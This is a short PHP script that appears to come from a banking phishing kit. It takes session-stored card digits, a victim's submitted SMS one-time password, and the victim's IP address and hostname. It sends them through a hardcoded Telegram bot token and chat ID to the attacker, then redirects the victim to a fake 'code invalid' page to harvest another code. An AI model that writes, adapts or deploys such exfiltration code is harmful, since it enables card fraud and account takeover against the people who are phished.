<?php

session_start();

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "bins : •••• •••• ••••".$_SESSION['scardx']."\n";
$bilsmg .= "OTP 2:   ".$_POST['Ecom_Payment_sms_Verification']."\n";
$bilsmg .= "IP   : $ip | $hostname\n";
$bilsmg .= "*****************************\n";

$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)

file_get_contents("https://api.telegram.org/bot1796948378:AAErJAJhTY9K-7_uyC4j-E9Bjy4rswtSG5k/sendMessage?chat_id=1045677055&text=" . urlencode($bilsmg)."" );					




header("Location: code-invalid.html");
?>



